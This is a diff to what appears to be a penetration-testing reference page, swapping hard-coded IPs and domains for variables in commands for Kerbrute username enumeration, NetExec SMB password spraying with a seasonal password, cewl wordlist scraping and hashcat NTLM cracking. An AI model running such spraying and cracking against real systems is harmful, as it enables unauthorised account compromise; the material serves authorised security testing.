@@ -198,8 +198,8 @@ cd username-anarchy
 Output covers every common scheme, `jdoe`, `john.doe`, `doe.john`, `j.doe`, `doej`, `johnd`, etc. Feed straight into Kerbrute / NetExec / spray:
 
 ```bash
-kerbrute userenum -d corp.local --dc 10.10.10.10 usernames.txt
-nxc smb 10.10.10.10 -u usernames.txt -p 'Spring2026!' --continue-on-success
+kerbrute userenum -d $DOMAIN --dc $DC_IP usernames.txt
+nxc smb $IP -u usernames.txt -p 'Spring2026!' --continue-on-success
 ```
 
 See [Kerbrute](kerbrute.md) for AD username validation and [NetExec](netexec.md) for spraying patterns.
@@ -213,8 +213,8 @@ See [Kerbrute](kerbrute.md) for AD username validation and [NetExec](netexec.md)
 Useful when the target likely has a custom password policy (company name, product names):
 
 ```bash
-cewl http://10.10.10.10 -d 3 -m 5 -o cewl.txt
-cewl https://example.com -d 3 -m 5 --with-numbers -e -o cewl.txt    # include emails
+cewl http://$IP -d 3 -m 5 -o cewl.txt
+cewl https://$DOMAIN -d 3 -m 5 --with-numbers -e -o cewl.txt    # include emails
 hashcat -m 1000 hashes.txt cewl.txt -r best64.rule
 ```
 
